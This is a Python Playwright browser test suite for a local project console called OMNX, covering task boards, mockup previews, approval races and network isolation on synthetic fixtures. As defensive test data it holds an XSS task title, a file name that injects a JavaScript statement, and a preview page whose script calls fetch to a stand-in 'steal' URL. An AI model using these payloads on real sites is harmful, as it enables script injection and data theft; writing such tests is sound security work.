#!/usr/bin/env python3
"""Real Chromium -> real loopback HTTP -> real engine -> synthetic files.

Developer-only dependency: Playwright + Chromium. No model or remote API calls.
The shipped JS is loaded by HTTP without patching it or replacing server routes.
"""
import sys, os, json, time, tempfile, threading, argparse, traceback, shutil, re, faulthandler
from pathlib import Path
sys.dont_write_bytecode=True
PACKAGE=Path(__file__).resolve().parents[2];sys.path.insert(0,str(PACKAGE/'scripts'))
from omnxlib.core import *
from omnxlib import console as cs, tasks, migration as mg, project
from omnxlib.decisions import Store
from playwright.sync_api import sync_playwright, expect


def main():
    parser=argparse.ArgumentParser();parser.add_argument('--output',required=True);parser.add_argument('--screenshots');parser.add_argument('--chromium',default=shutil.which('chromium'));parser.add_argument('--isolated-dom',action='store_true',help='Offline DOM fixture transport; not HTTP/CSP/cookie coverage')
    args=parser.parse_args();browser_version='not_started';records=[];screens=Path(args.screenshots) if args.screenshots else None
    if screens:screens.mkdir(parents=True,exist_ok=True)
    def case(name,fn):
        start=time.perf_counter();print('RUN',name,flush=True)
        try:fn();records.append({'test':name,'status':'pass','seconds':round(time.perf_counter()-start,3)});print('PASS',name,flush=True)
        except Exception as e:
            records.append({'test':name,'status':'fail','error':str(e)[:1600],'seconds':round(time.perf_counter()-start,3)});print('FAIL',name,str(e)[:500],flush=True)
    with tempfile.TemporaryDirectory(prefix='omnx-browser-') as tmp:
        root=Path(tmp);repo=root/'mentorias';repo.mkdir();fs=RootFS(repo)
        p=mg.make_plan(fs,'test:synthetic-fixture','explicit:read');mg.apply(fs,p,p['plan_digest'])
        config=fs.data('.omnx/project.yaml',yaml_ok=True);config['name']='OMNX Mentorias · Demonstração';fs.write('.omnx/project.yaml',json_bytes(config),fs.hash('.omnx/project.yaml'))
        def task(title,state='ready',authorized=True):
            s=tasks.Store(fs);x=s.create({'title':title,'status':'ready' if authorized else 'backlog','authorization':{'status':'authorized' if authorized else 'proposed','basis_ref':'test:synthetic' if authorized else None},'acceptance':['Resultado visível para o cliente.','Escopo preservado sem publicação automática.'],'priority':'high'},'Fixture sintética. Sem dados de clientes reais.\nAPI_SECRET="synthetic-long-value-0123456789"')
            if state in ('in_progress','review','done'):x=s.update(x['task']['id'],{'owner':'fixture-agent'},x['sha256'],transition='in_progress')
            if state in ('review','done'):x=s.update(x['task']['id'],{},x['sha256'],transition='review')
            if state=='blocked':x=s.update(x['task']['id'],{'blocked_reason':'Aguardando validação de isolamento entre clientes.'},x['sha256'],transition='blocked')
            if state=='done':x=s.update(x['task']['id'],{'closure':{'scope_met':True,'diff_reviewed':True,'documentation':'Fixture','known_regression':False,'delivery':'patch','evidence':[{'ref':'test:fixture','result':'pass','summary':'Synthetic only'}],'limitations':[],'authority_ref':'test:synthetic'}},x['sha256'],transition='done')
            return x
        t1=task('Fila prioritária de atendimento','in_progress');blocked=task('Validação entre clientes','blocked');t3=task('Cadastro de clientes','review');task('Melhoria proposta',authorized=False);task('Organização da carteira','done')
        hostile=task('<img src=x onerror=globalThis.__xss=1> deve ser texto',authorized=False)
        htmlrel='docs/ux/proposals/UX-fila/index.html'
        html=b'''<!doctype html><html><head><style>body{font-family:system-ui;background:#f3f7fc;margin:0;color:#192d48}header{background:#fff;padding:25px;border-bottom:1px solid #dfe7f0}main{padding:30px}.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}.card{background:white;padding:24px;border-radius:14px;border:1px solid #dfe7f0}button{background:#126bec;color:#fff;padding:11px 18px;border:0;border-radius:8px}small{color:#69809d}</style></head><body><header><b>OMNX Mentorias</b> &nbsp; / &nbsp; CRM de entrega</header><main><small>PROPOSTA VISUAL COM DADOS FICTICIOS</small><h1>Quem precisa de voce hoje?</h1><p>Uma fila clara para acompanhar cada cliente.</p><div class="grid"><div class="card"><small>RESPOSTA PENDENTE</small><h2>Cliente demonstracao A</h2><p>Mensagem recebida ha 15 minutos.</p><button>Ver conversa</button></div><div class="card"><small>ACOMPANHAMENTO</small><h2>Cliente demonstracao B</h2><p>Contato de acompanhamento previsto para hoje.</p><button>Preparar contato</button></div></div></main></body></html>'''
        fs.write(htmlrel,html,None)
        decision=Store(fs).create({'type':'ux','title':'Nova fila de atendimento','question':'Aprovar a organização desta fila de acompanhamento?','subject_ref':htmlrel,'task_refs':[t1['task']['id']],'options':[{'id':'a','label':'Adotar esta organização','description':'Manter a prioridade apresentada.'},{'id':'b','label':'Priorizar acompanhamento','description':'Outra decisão ilustrativa.'}]})
        race=Store(fs).create({'type':'product','title':'Escolha compartilhada','question':'Escolha A ou B nesta fixture.','options':[{'id':'a','label':'Opção A','description':'Primeira opção.'},{'id':'b','label':'Opção B','description':'Segunda opção.'}]})
        stale=Store(fs).create({'type':'ux','title':'Proposta que será alterada','question':'Aprovar este conteúdo?','subject_ref':htmlrel})
        risk=Store(fs).create({'type':'release','title':'Publicação em produção','question':'Apenas leitura; não autorizar por aqui.'})
        badname="screen');globalThis.__omnx_xss=1;('x.html"
        fs.write('docs/ux/proposals/UX-attack/'+badname,b'''<script>globalThis.__preview_executed=1;fetch('https://invalid.example/steal')</script><meta http-equiv="refresh" content="0;url=https://invalid.example/"><img src="https://invalid.example/x"><a href="https://invalid.example/">nao navegar</a><form action="https://invalid.example/"><input><button>nao enviar</button></form><h1>Conteudo isolado</h1>''',None)
        cs.CATALOG_DIR=root/'catalog';cs.CATALOG=cs.CATALOG_DIR/'projects.json';item=cs.register(repo)
        clone=root/'mentorias-copia';clone.mkdir();RootFS(clone).write('.omnx/project.yaml',fs.read('.omnx/project.yaml'),None);cs.register(clone)
        server=cs.ConsoleServer();thread=threading.Thread(target=server.serve_forever,daemon=True);thread.start()
        try:
            with sync_playwright() as pw:
                browser=pw.chromium.launch(executable_path=args.chromium,headless=True,args=['--no-sandbox']);browser_version=browser.version
                context=browser.new_context(viewport={'width':1440,'height':1000},permissions=['clipboard-read','clipboard-write']);context.set_default_timeout(8000)
                attempts=[];page_errors=[]
                def route(r):
                    if not r.request.url.startswith(server.origin+'/'):
                        attempts.append(r.request.url);r.abort()
                    else:r.continue_()
                context.route('**/*',route)
                page=context.new_page();page.on('pageerror',lambda e:page_errors.append(str(e)))
                
                def mount_page(pg):
                    if args.isolated_dom:
                        from isolated_transport import OfflineTransport,mount
                        mount(pg,PACKAGE,OfflineTransport([repo,clone]))
                    else:pg.goto(server.issue_bootstrap())
                mount_page(page);browser_version=browser.version;expect(page.get_by_role('heading',name='Clareza sobre o que vem a seguir.')).to_be_visible()
                def close(pg=page):
                    if pg.locator('#modal').is_visible():pg.get_by_role('button',name='Fechar detalhes').click()
                def view(name,pg=page):
                    close(pg);pg.locator('#projectSelect').select_option(item['workspace_id']);pg.locator(f'.nav[data-view="{name}"]').click()
                def home_test():
                    expect(page.locator('.project-card')).to_have_count(2);assert not page_errors;assert '#key=' not in page.url
                    if screens:page.screenshot(path=str(screens/'console-overview.png'),full_page=True,timeout=12000)
                case('B01-panel-bootstrap-and-two-workspaces',home_test)
                def kanban():
                    view('tasks');expect(page.locator('.column[data-status="blocked"]')).to_contain_text('Validação entre clientes');expect(page.locator('.column[data-status="in_progress"]')).to_contain_text('Fila prioritária');
                    if screens:page.screenshot(path=str(screens/'console-kanban.png'),full_page=True,timeout=12000)
                case('B02-blocked-tasks-visible',kanban)
                def invalid_isolated():
                    fs.write('.omnx/tasks/TASK-bad.md',b'---\ninvalid',None);page.locator('#refreshBtn').click();expect(page.locator('.notice').first).to_contain_text('Alguns itens');expect(page.locator('.column[data-status="blocked"]')).to_contain_text('Validação entre clientes')
                    fs.delete('.omnx/tasks/TASK-bad.md',fs.hash('.omnx/tasks/TASK-bad.md'));page.locator('#refreshBtn').click()
                case('B03-invalid-task-does-not-hide-board',invalid_isolated)
                def safe_title():
                    view('tasks');page.get_by_role('button',name='<img src=x onerror=globalThis.__xss=1> deve ser texto',exact=True).click();expect(page.locator('#modalBody h2')).to_have_text('<img src=x onerror=globalThis.__xss=1> deve ser texto');assert page.evaluate('globalThis.__xss') is None;close()
                case('B04-untrusted-title-is-literal-data',safe_title)
                def prompt_test():
                    view('tasks');page.get_by_role('button',name='Fila prioritária de atendimento',exact=True).click();page.get_by_role('button',name='Copiar prompt para continuar').click();text=page.locator('textarea.prompt').input_value();assert config['project_id'] in text;assert len(text)<2400;assert 'synthetic-long-value' not in text
                    page.get_by_role('button',name='Copiar prompt',exact=True).click();expect(page.locator('#toast')).to_contain_text('Prompt copiado');assert page.evaluate('navigator.clipboard.readText()')==text;close()
                case('B05-compact-prompt-and-copy-action',prompt_test)
                def preview_test():
                    view('mockups');expect(page.locator('.mockup')).to_have_count(2)
                    card=page.locator('.mockup').filter(has=page.get_by_text(badname,exact=True));card.get_by_role('button').click();expect(page.frame_locator('iframe.preview-frame').get_by_role('heading',name='Conteudo isolado')).to_be_visible()
                    assert page.evaluate('globalThis.__omnx_xss') is None
                    frame=page.frames[-1];assert frame.evaluate('globalThis.__preview_executed') is None;assert not attempts
                    frame.get_by_text('nao navegar',exact=True).click();assert not attempts;close()
                case('B06-malicious-preview-name-and-static-isolation',preview_test)
                def ux_approval():
                    view('decisions');page.locator('.decision-card').filter(has=page.get_by_role('heading',name='Nova fila de atendimento',exact=True)).get_by_role('button').click()
                    expect(page.frame_locator('iframe.preview-frame').get_by_role('heading',name='Quem precisa de voce hoje?')).to_be_visible()
                    page.get_by_role('button',name='Aprovar proposta',exact=True).click();expect(page.locator('.form-error')).to_contain_text('Escolha uma opção')
                    page.locator('input[name="decision-option"][value="a"]').check();expect(page.locator('.form-error')).to_have_text('')
                    if screens:page.screenshot(path=str(screens/'console-approval.png'),full_page=True,timeout=12000)
                    page.get_by_role('button',name='Aprovar proposta',exact=True).click();expect(page.locator('#modal')).not_to_be_visible()
                    d=Store(fs).get(decision['decision']['id'])[1];assert d['selected_option']=='a';assert d['status']=='approved';assert len(d['history'])==1
                case('B07-visual-approval-requires-choice-and-persists',ux_approval)
                def stale_two_tabs():
                    view('decisions');page.locator('.decision-card').filter(has=page.get_by_role('heading',name='Escolha compartilhada',exact=True)).get_by_role('button').click()
                    other=context.new_page();other.on('pageerror',lambda e:page_errors.append(str(e)));mount_page(other);expect(other.get_by_role('heading',name='Clareza sobre o que vem a seguir.')).to_be_visible();view('decisions',other)
                    other.locator('.decision-card').filter(has=other.get_by_role('heading',name='Escolha compartilhada',exact=True)).get_by_role('button').click()
                    page.locator('input[value="a"]').check();page.get_by_role('button',name='Aprovar proposta',exact=True).click();expect(page.locator('#modal')).not_to_be_visible()
                    other.locator('input[value="b"]').check();other.get_by_role('button',name='Aprovar proposta',exact=True).click();expect(other.locator('.form-error')).to_contain_text('mudou')
                    assert Store(fs).get(race['decision']['id'])[1]['selected_option']=='a';other.close()
                case('B08-two-tabs-stale-approval-rejected',stale_two_tabs)
                def stale_subject():
                    view('decisions');page.locator('.decision-card').filter(has=page.get_by_role('heading',name='Proposta que será alterada',exact=True)).get_by_role('button').click()
                    expect(page.locator('iframe.preview-frame')).to_be_visible();fs.write(htmlrel,html+b'<p>changed</p>',fs.hash(htmlrel))
                    page.get_by_role('button',name='Aprovar proposta',exact=True).click();expect(page.locator('.form-error')).to_contain_text('mudaram');assert Store(fs).get(stale['decision']['id'])[1]['status']=='pending';close()
                case('B09-subject-changed-after-view-is-not-approved',stale_subject)
                def critical_readonly():
                    view('decisions');page.locator('.decision-card').filter(has=page.get_by_role('heading',name='Publicação em produção',exact=True)).get_by_role('button').click();expect(page.get_by_role('button',name='Aprovar proposta',exact=True)).to_have_count(0);close()
                case('B10-release-not-approved-from-console',critical_readonly)
                def move_task():
                    view('tasks');page.get_by_role('button',name='Fila prioritária de atendimento',exact=True).click();page.get_by_label('Novo estado',exact=True).select_option('blocked');page.get_by_label('Motivo do bloqueio',exact=True).fill('Esperando revisão técnica.');page.get_by_role('button',name='Registrar estado',exact=True).click();expect(page.locator('#modal')).not_to_be_visible();expect(page.locator('.column[data-status="blocked"]')).to_contain_text('Fila prioritária de atendimento')
                case('B11-state-transition-through-ui-and-engine',move_task)
                def keyboard_mobile():
                    view('tasks');page.get_by_role('button',name='Cadastro de clientes',exact=True).focus();page.keyboard.press('Enter');expect(page.locator('#modal')).to_be_visible();page.keyboard.press('Escape');expect(page.locator('#modal')).not_to_be_visible()
                    page.set_viewport_size({'width':390,'height':844});page.locator('.nav[data-view="home"]').click();expect(page.get_by_role('heading',name='Clareza sobre o que vem a seguir.')).to_be_visible()
                    assert page.evaluate('document.documentElement.scrollWidth <= window.innerWidth+2')
                    if screens:page.screenshot(path=str(screens/'console-mobile.png'),full_page=True,timeout=12000)
                case('B12-keyboard-and-mobile-layout',keyboard_mobile)
                case('B13-no-uncaught-errors-or-external-network',lambda:(require(not page_errors,'browser_errors',str(page_errors)),require(not attempts,'external_requests',str(attempts))))
                browser_version=browser.version;print('CLEANUP browser',flush=True);faulthandler.dump_traceback_later(15);browser.close();faulthandler.cancel_dump_traceback_later();print('CLEANUP browser done',flush=True)
        except Exception as e:
            records.append({'test':'browser-capability','status':'blocked','error':re.sub(r'#key=[^\s\"]+','#key=[REDACTED]',str(e).split('Call log:')[0])[:1000]});print(traceback.format_exc(),flush=True)
        finally:
            print('CLEANUP server',flush=True);server.shutdown();server.server_close();thread.join(timeout=3);print('CLEANUP server done',flush=True)
    report={'schema_version':1,'package':'omnx-code','version':load_data((PACKAGE/'manifest.json').read_bytes())['version'],'executed_at':now(),'browser':'Chromium '+browser_version,'platform':sys.platform,'transport':('Offline DOM + in-process fixture engine. Fetch/history/UUID/clipboard doubled; iframe URLs become offline srcdoc. No HTTP, cookies, CSP-header or native clipboard coverage.' if args.isolated_dom else 'Real HTTP on 127.0.0.1, unmodified shipped JavaScript'),'tests_run':len(records),'failures':sum(r['status']!='pass' for r in records),'tests':records,'scope':'Synthetic local projects. No real Codex/Claude session, production, Windows/macOS browser, or model-token benchmark.'}
    Path(args.output).write_text(json.dumps(report,ensure_ascii=False,indent=2)+'\n')
    return 1 if report['failures'] else 0
if __name__=='__main__':raise SystemExit(main())
